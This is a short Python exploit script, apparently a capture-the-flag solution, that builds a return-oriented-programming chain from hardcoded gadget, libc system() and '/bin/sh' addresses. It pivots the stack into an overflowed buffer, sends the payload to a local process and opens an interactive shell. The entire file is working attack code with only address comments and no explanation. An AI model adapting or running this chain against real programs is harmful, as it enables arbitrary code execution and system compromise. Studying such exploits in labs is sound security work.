import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
print(p.readuntil('chain:'))

libc_base = 0x7f0000228000
pop_rdi = p64(0x4007e3)
pop_rsp = p64(libc_base+0x3838)
sh = p64(0x7f00003b4d57)
system = p64(0x7f000026d390)
buffer_start = p64(0x7fffffffed70) # rbp-0x40

payload = pop_rdi + sh + system + "A"*48 + pop_rsp + buffer_start

p.sendline(payload)
p.interactive() 

# system = 0x7f000026d390
# /bin/sh at 0x7f00003b4d57
# 0x00000000004007e3 : pop rdi ; ret
# 0x0000000000003838 : pop rsp ; ret
# buffer starts at 0x7fffffffed70 i.e. rbp-0x40
